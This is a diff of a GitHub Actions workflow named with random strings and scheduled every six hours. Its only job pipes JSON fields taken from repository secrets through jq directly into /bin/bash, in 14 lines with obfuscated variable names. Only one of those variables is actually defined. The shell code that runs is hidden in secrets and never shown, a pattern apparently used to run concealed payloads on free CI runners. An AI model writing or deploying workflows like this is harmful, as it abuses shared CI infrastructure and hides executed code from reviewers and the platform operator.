@@ -1,28 +1,32 @@
 name: liupianan7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 2/6 * * *'
-jobs:  # 2126
+    - cron: '32 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liupianan7654
         env:
-          qpsi23: ${{ secrets.qpsi23 }}
+          tou52814: ${{ secrets.tou52814 }}
         run: |
-          echo $qpsi23 | jq -r .zeyxv60 | /bin/bash
-          echo $jgx215 | jq -r .bapdg65 | /bin/bash
-          echo $ms0192 | jq -r .jd359 | /bin/bash
-          echo $douv65 | jq -r .jifu197 | /bin/bash
-          echo $dvyjr7 | jq -r .i71 | /bin/bash
-          echo $t7 | jq -r .wfsj13091 | /bin/bash
-          echo $o869 | jq -r .afyrb42441 | /bin/bash
-          echo $dziji73 | jq -r .pkxz57709 | /bin/bash
-          echo $mr4 | jq -r .tx6 | /bin/bash
-          echo $kzn2808 | jq -r .dmaxw24850 | /bin/bash
-          echo $alkux55435 | jq -r .rgak15 | /bin/bash
-          echo $ao51263 | jq -r .gdd5 | /bin/bash
-          echo $gzoc09 | jq -r .h20 | /bin/bash
+          echo $tou52814 | jq -r .cdoz9691 | /bin/bash
+          echo $a31535 | jq -r .krnp5 | /bin/bash
+          echo $dazf154 | jq -r .x8830 | /bin/bash
+          echo $o2 | jq -r .gctq9 | /bin/bash
+          echo $z92324 | jq -r .dlqhn9555 | /bin/bash
+          echo $jd9 | jq -r .q58 | /bin/bash
+          echo $kshl44 | jq -r .h23986 | /bin/bash
+          echo $z0120 | jq -r .paggy16 | /bin/bash
+          echo $b87878 | jq -r .hnja26 | /bin/bash
+          echo $ezv80684 | jq -r .hx464 | /bin/bash
+          echo $ngj944 | jq -r .ljlvc63 | /bin/bash
+          echo $udsk52 | jq -r .beap5 | /bin/bash
+          echo $nlgtm8780 | jq -r .natzb4 | /bin/bash
+          echo $a11 | jq -r .tsjpk3167 | /bin/bash
 
